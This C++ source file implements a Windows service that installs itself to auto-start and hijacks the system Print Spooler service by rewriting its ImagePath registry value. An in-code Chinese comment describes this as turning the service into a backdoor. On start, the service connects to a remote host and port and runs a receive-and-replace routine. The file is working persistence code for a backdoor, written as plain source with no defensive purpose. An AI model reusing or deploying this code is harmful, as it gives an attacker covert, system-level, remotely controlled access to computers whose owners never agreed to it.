#include "pch.h"
#include "service.h"
#include "plog/Log.h"

bool service::isRunning = false;
SERVICE_STATUS service::serviceStatus;
SERVICE_STATUS_HANDLE service::hServiceStatus;


service::service()
{

}
bool service::ServiceInstall(TCHAR * exeFilePath)
{
	TCHAR tmpPath[MAX_PATH] = { 0 };
#ifdef DEBUG
	//TCHAR tmp[256] = { 0 };
	//sprintf_s(tmp, 256, "Install: Path is : %s\n", exeFilePath);
	//LogToFile()
	LOG_INFO << TEXT("Install: Path is :") << exeFilePath;
#endif // DEBUG
	SC_HANDLE serviceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (serviceManagerHandle == 0) {
#ifdef DEBUG
		LOG_INFO << TEXT("Install: Open services manager database error :") << GetLastError();
#endif
		return FALSE;
	}

	SC_HANDLE serviceHandle = CreateService(
		serviceManagerHandle,
		SERVICE_NAME,
		SERVICE_DISPLAY_NAME,
		SERVICE_ALL_ACCESS,//访问权限
		SERVICE_WIN32_OWN_PROCESS, // win32类型服务
		SERVICE_AUTO_START,//自启动类型
		SERVICE_ERROR_NORMAL,//错误处理，此处忽略
		exeFilePath,//服务程序路径
		NULL, //不属于任何用户组
		NULL, //使用已存在的标签
		NULL, //独立的服务
		NULL, //本地系统账号
		NULL //密码为空
	);
	if (serviceHandle == 0) {
		LOG_INFO << TEXT("Create service error:") << GetLastError();
		CloseServiceHandle(serviceManagerHandle);
	}
#ifdef DEBUG
	LOG_INFO << TEXT("Install: create services successful");
#endif
	//strcpy(tmpPath, "SYSTEM\\CurrentControlSet\\Services\\");
	//strcat(tmpPath, SERVICE_NAME);

	HKEY key;
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\x5MGCBase"), &key) != ERROR_SUCCESS)
	{
#ifdef DEBUG
		LOG_INFO << TEXT("Install: Open key %s error:") << GetLastError();
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	LOG_INFO << TEXT("Install: open regedit successful");
#endif
	RegSetValueEx(key, TEXT("Description"), 0, REG_SZ, (BYTE *)SERVICE_DESCRIPTION, lstrlen(SERVICE_DESCRIPTION));
#ifdef DEBUG
	LOG_INFO << TEXT("Install: write regedit successful");
#endif
	RegCloseKey(key);
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(serviceManagerHandle);
	//替换系统服务Spooler的执行路径，改为后门
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\Spooler"), &key) != ERROR_SUCCESS)
	{
#ifdef DEBUG
		LOG_INFO << TEXT("Install: Open key %s error:") << GetLastError();
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	LOG_INFO << TEXT("Install: write regedit successful");
#endif
	if (RegSetValueEx(key, TEXT("ImagePath"), 0, REG_EXPAND_SZ, (BYTE *)exeFilePath, lstrlen(exeFilePath)) != ERROR_SUCCESS)
	{
#ifdef DEBUG
		LOG_INFO << TEXT("Install: Set key:") << exeFilePath << TEXT(" value error: ") << GetLastError();
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	LOG_INFO << TEXT("Install: write regedit successful");
#endif
	RegCloseKey(key);
	return TRUE;
}

service::~service()
{
}



//删除服务
bool service::ServiceUnstall(TCHAR * serviceName)
{
	HKEY key;
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\Spooler"), &key) != ERROR_SUCCESS) {
		LOG_INFO << TEXT("Open Key");
	}

	if (RegSetValueEx(key, TEXT("ImagePath"), 0, REG_EXPAND_SZ, (BYTE *)oldFilePath, lstrlen(oldFilePath)) != ERROR_SUCCESS)
	{
#ifdef DEBUG
		LOG_INFO << TEXT("Install: Set key:") << oldFilePath << TEXT(" value error: ") << GetLastError();
#endif // DEBUG
		return FALSE;
	}
	RegCloseKey(key);
	return TRUE;
}



void WINAPI service::ServiceControl(DWORD dwControl)
{
#ifdef DEBUG
	LOG_INFO << TEXT("ServiceControl: Into ServiceControl");
#endif
	switch (dwControl)
	{
	case SERVICE_CONTROL_PAUSE:
		serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		serviceStatus.dwCheckPoint = 0;
		isRunning = FALSE;
		SetServiceStatus(hServiceStatus, &serviceStatus);
		return;
	case SERVICE_CONTROL_INTERROGATE: break;
	default:
#ifdef DEBUG
		LOG_INFO << TEXT("ServiceControl: Error arguments");
#endif // DEBUG
		break;
	}
	SetServiceStatus(hServiceStatus, &serviceStatus);
	return;
}



void WINAPI service::ServiceMain(DWORD   dwNumServicesArgs,PCHAR  *lpServiceArgVectors)
{
	LOG_INFO << "ServiceMain Start!";
	//设置服务初始化时的基本状态
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;//here
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	serviceStatus.dwWin32ExitCode = 0;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
#ifdef DEBUG
	LOG_INFO << TEXT("ServiceMain: Try to register service");
#endif
	hServiceStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceControl);
	if (hServiceStatus == (SERVICE_STATUS_HANDLE)0) { //判断注册情况	
#ifdef DEBUG
		LOG_INFO << TEXT("ServiceMain: Register serviceControl error:") << GetLastError();
#endif
		return;
	}
	LOG_INFO << TEXT("ServiceMain Register serviceControl successful");
	//注册成功，修改服务状态
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	if (!SetServiceStatus(hServiceStatus, &serviceStatus)) { //向系统报告服务状态
		LOG_INFO << TEXT("ServiceMain: Start service error:") << GetLastError();
		return;
	}
	isRunning = true;
	int i = 0;
	//while (true)
	//{
	//	//if (!isRunning) break;
	//	//++i;
	//	//LOG_INFO << i;
	//	//Sleep(1000);

	//}
	x5MGCConnection socket;
	socket.connectTo(GAME_HOST, GAME_PORT);
	socket.RecvReplace();
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(hServiceStatus, &serviceStatus);
}